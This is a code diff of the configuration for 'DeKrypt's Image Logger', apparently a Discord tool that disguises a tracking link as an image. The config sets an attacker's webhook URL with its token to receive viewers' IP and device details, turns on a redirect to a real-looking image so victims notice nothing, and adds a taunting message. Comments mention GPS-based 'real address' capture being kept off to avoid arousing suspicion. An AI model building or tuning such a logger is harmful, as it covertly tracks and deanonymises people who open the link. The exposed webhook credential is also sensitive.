@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1255231545455939829/mVn-8O4iosrZH7w8UCsJEMUr1DaWgyXuwh40Wi8Lcs0kAqtrnc4YREIQan3cGytulGdC",
-    "image": "https://cdn.discordapp.com/attachments/1255231506230808778/1255232560988950669/image602943490l.png?ex=667c61eb&is=667b106b&hm=0cc63b463fb4fb3288e59b624e2dbb826858b70a8bb18b3f886222a22c8590ee&", # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1255231506230808778/1255606741639499821/middle-click.png?ex=667dbe67&is=667c6ce7&hm=d899e2038d6ff68ecaebac393cbc3d18a9fd63d49ccdbcf2ba2afdcf2ad8f7ec&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "You are an idiot.", # Message to show
         "richMessage": False, # Enable rich text? (See README for more info)
     },
 
@@ -38,7 +38,7 @@ config = {
                 # 2 = Don't send an alert when a VPN is suspected
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 2, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://cdn.discordapp.com/attachments/1255231506230808778/1255232560988950669/image602943490l.png?ex=667db36b&is=667c61eb&hm=51b472c5c08277931a1922d2cd702e86fab359246173b7694ee5ca7bafbc7977&" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
